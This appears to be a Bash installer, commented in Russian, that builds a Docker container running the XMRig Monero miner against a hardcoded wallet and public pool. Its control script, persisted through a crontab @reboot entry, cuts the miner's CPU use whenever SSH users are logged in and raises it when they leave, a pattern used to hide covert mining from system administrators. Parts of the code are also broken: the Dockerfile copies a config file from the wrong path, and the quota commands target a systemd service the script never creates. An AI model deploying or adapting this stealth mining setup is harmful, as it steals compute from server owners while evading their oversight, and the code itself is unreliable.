#!/bin/bash

set -e  # Завершение скрипта при возникновении ошибки

# Задаем переменные
XMRIG_VERSION="6.15.0"
XMRIG_DIR="/usr/local/xmrig"
XMRIG_BIN="$XMRIG_DIR/xmrig"
POOL="pool.supportxmr.com:3333"
WALLET="467i7PYq63KSkgCq8TyuWpRyruY8fipyu9hnBgvCPCMXhLmT1Nepb3p2grsi12aHEg9Fosn4YypzdH3LMFZ1EjQWS8MtkPJ"
CONTROL_SCRIPT="/usr/local/bin/xmrig_control.sh"
CONFIG_FILE="/etc/xmrig/config.json"
NUM_WORKERS=8

# Определение количества ядер
NUM_CORES=$(nproc)

# Установка Docker
echo "Установка Docker..."
sudo apt-get update
sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
sudo apt-get update
sudo apt-get install -y docker-ce

# Запуск и проверка Docker
sudo systemctl start docker
sudo systemctl enable docker
sudo docker --version

# Установка Docker Compose
echo "Установка Docker Compose..."
DOCKER_COMPOSE_VERSION="1.29.2"
sudo curl -L "https://github.com/docker/compose/releases/download/$DOCKER_COMPOSE_VERSION/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
docker-compose --version

# Создание Dockerfile для XMRig
echo "Создание Dockerfile..."
DOCKERFILE_PATH="/tmp/Dockerfile"
cat <<EOF | sudo tee $DOCKERFILE_PATH
FROM ubuntu:20.04

# Установка зависимостей
RUN apt-get update && apt-get install -y wget tar

# Загрузка и установка XMRig
RUN wget https://github.com/xmrig/xmrig/releases/download/v$XMRIG_VERSION/xmrig-$XMRIG_VERSION-linux-x64.tar.gz -O /tmp/xmrig.tar.gz && \
    tar -xzf /tmp/xmrig.tar.gz -C /opt && \
    mv /opt/xmrig-$XMRIG_VERSION/xmrig /usr/local/bin/xmrig && \
    chmod +x /usr/local/bin/xmrig && \
    rm -rf /tmp/xmrig*

# Копирование конфигурационного файла
COPY config.json /etc/xmrig/config.json

# Запуск XMRig
CMD ["xmrig", "--config", "/etc/xmrig/config.json"]
EOF

# Создание конфигурационного файла для XMRig
echo "Создание конфигурационного файла для XMRig..."
sudo mkdir -p /etc/xmrig
cat <<EOF | sudo tee $CONFIG_FILE
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "threads": $NUM_CORES
  },
  "pools": [
    $(for i in $(seq 1 $NUM_WORKERS); do
        echo -n "{
          \"url\": \"$POOL\",
          \"user\": \"$WALLET.worker$i\",
          \"pass\": \"x\",
          \"coin\": \"monero\"
        }"
        [[ $i -lt $NUM_WORKERS ]] && echo -n ","
      done)
  ],
  "api": {
    "enabled": false,
    "port": 0
  }
}
EOF

# Построение Docker-образа
echo "Построение Docker-образа для XMRig..."
sudo docker build -t xmrig-image -f $DOCKERFILE_PATH /tmp

# Запуск контейнера XMRig
echo "Запуск контейнера XMRig..."
sudo docker run -d --name xmrig-container xmrig-image

# Проверка состояния контейнера
echo "Проверка состояния контейнера..."
sudo docker ps -a

# Создание скрипта для управления нагрузкой XMRig в зависимости от SSH-подключений
echo "Создание скрипта управления XMRig..."
cat <<EOF | sudo tee $CONTROL_SCRIPT
#!/bin/bash

# Функция для обновления CPUQuota в зависимости от количества SSH-подключений
update_cpu_quota() {
    ssh_connections=\$(who | grep -c "ssh")
    if [ \$ssh_connections -gt 0 ]; then
        sudo systemctl set-property --runtime -- xmrig.service CPUQuota=30%
    else
        sudo systemctl set-property --runtime -- xmrig.service CPUQuota=90%
    fi
}

# Бесконечный цикл для проверки каждые 60 секунд
while true; do
    update_cpu_quota
    sleep 60
done
EOF

# Делаем скрипт исполняемым
sudo chmod +x $CONTROL_SCRIPT

# Добавление скрипта в автозагрузку через crontab
(crontab -l 2>/dev/null; echo "@reboot $CONTROL_SCRIPT") | crontab -

# Запуск скрипта управления XMRig
$CONTROL_SCRIPT &

echo "Установка и настройка завершены."
